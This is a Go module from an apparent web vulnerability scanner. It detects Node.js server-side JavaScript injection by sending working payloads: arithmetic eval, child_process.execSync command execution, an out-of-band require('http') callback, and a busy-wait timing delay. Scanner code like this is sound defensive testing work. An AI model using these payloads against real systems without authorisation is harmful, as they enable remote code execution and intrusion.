package modules

import (
	"context"
	"fmt"
	"strings"
	"time"
)

func (r *Runner) runSSJS(ctx context.Context, target ScanTarget) []ModuleFinding {
	if ok, reason := r.shouldRunModule("server_side_js_injection", target); !ok {
		r.emitSkip("server_side_js_injection", target, reason)
		return nil
	}

	if target.Parameter == "" {
		return nil
	}

	baseline, baselineErr := r.cachedEmptyProbe(ctx, target)
	if baselineErr != nil {
		return nil
	}

	var out []ModuleFinding

	// Test 1: Arithmetic & Global Object Evaluation
	evalPayload := "res.end((7777*7777).toString())"
	evalRR, err := r.probe(ctx, target, evalPayload)
	if err == nil && evalRR.Response.StatusCode == 200 && strings.Contains(evalRR.Response.Body, "60481729") {
		signal := "ssjs_eval_arithmetic"
		p := defaultPayload("server_side_js_injection", signal, evalPayload, signal)
		f := r.verifyAndBuild(ctx, "server_side_js_injection", target, p, baseline, evalRR, signal, false, false, "", "")
		if f != nil {
			f.Severity = "critical"
			f.Title = "Server-Side JavaScript (Node.js) Code Execution"
			f.Description = fmt.Sprintf("Server-side JavaScript injection confirmed on parameter '%s' via arbitrary arithmetic code evaluation.", target.Parameter)
			r.recordFinding(ctx, &out, f, "server_side_js_injection", signal)
			return out
		}
	}

	// Test 2: Node.js global process/require execution
	processPayload := "global.process.mainModule.require('child_process').execSync('echo akcassjs'+'marker')"
	procRR, pErr := r.probe(ctx, target, processPayload)
	if pErr == nil && procRR.Response.StatusCode == 200 && strings.Contains(procRR.Response.Body, "akcassjsmarker") {
		signal := "ssjs_child_process_exec"
		p := defaultPayload("server_side_js_injection", signal, processPayload, signal)
		f := r.verifyAndBuild(ctx, "server_side_js_injection", target, p, baseline, procRR, signal, false, false, "", "")
		if f != nil {
			f.Severity = "critical"
			f.Title = "Server-Side JavaScript (Node.js) RCE via child_process"
			f.Description = fmt.Sprintf("Arbitrary shell command execution confirmed on parameter '%s' via Node.js require('child_process').execSync.", target.Parameter)
			r.recordFinding(ctx, &out, f, "server_side_js_injection", signal)
			return out
		}
	}

	// Test 3: OAST Out-of-band SSRF via require('http')
	if r.cfg.EnableOAST && r.oast != nil {
		if oastURL := strings.TrimSpace(r.oastURL(ctx, "ssjs-oast", target, "server_side_js_injection")); oastURL != "" {
			r.sendOASTProbe(ctx, target, oastURL)
			oastPayload := fmt.Sprintf("require('http').get('http://%s/ssjs')", oastURL)
			_, _ = r.probe(ctx, target, oastPayload)
		}
	}

	// Test 4: Time-delay (Busy-Wait Loop)
	busyPayload := "var a=new Date(); do{var b=new Date();}while(b-a<5000);"
	start := time.Now()
	busyRR, bErr := r.probe(ctx, target, busyPayload)
	elapsed := time.Since(start)

	if bErr == nil && elapsed >= 4500*time.Millisecond && baseline.Response.Duration < 2000*time.Millisecond {
		// Verify zero-delay control
		zeroPayload := "var a=new Date(); do{var b=new Date();}while(b-a<0);"
		zStart := time.Now()
		_, _ = r.probe(ctx, target, zeroPayload)
		zElapsed := time.Since(zStart)

		if zElapsed < 2500*time.Millisecond {
			signal := "ssjs_time_delay"
			p := defaultPayload("server_side_js_injection", signal, busyPayload, signal)
			f := r.verifyAndBuild(ctx, "server_side_js_injection", target, p, baseline, busyRR, signal, false, false, "", "")
			if f != nil {
				f.Severity = "critical"
				f.Title = "Server-Side JavaScript (Node.js) Blind Timing Injection"
				f.Description = fmt.Sprintf("Server-side JavaScript blind timing delay (~5000ms) confirmed on parameter '%s'.", target.Parameter)
				r.recordFinding(ctx, &out, f, "server_side_js_injection", signal)
			}
		}
	}

	return out
}

func ssjsSignalConfirmed(body, baseline, signal string, probeStatus, baseStatus int) bool {
	if signal == "ssjs_time_delay" {
		return probeStatus > 0 && probeStatus < 500 && !rateLimitBlockSignal(probeStatus, body)
	}
	if probeStatus != 200 || body == baseline && probeStatus == baseStatus {
		return false
	}
	switch signal {
	case "ssjs_eval_arithmetic":
		return strings.Contains(body, "60481729") && !strings.Contains(baseline, "60481729")
	case "ssjs_child_process_exec":
		return strings.Contains(body, "akcassjsmarker") && !strings.Contains(baseline, "akcassjsmarker")
	default:
		return false
	}
}
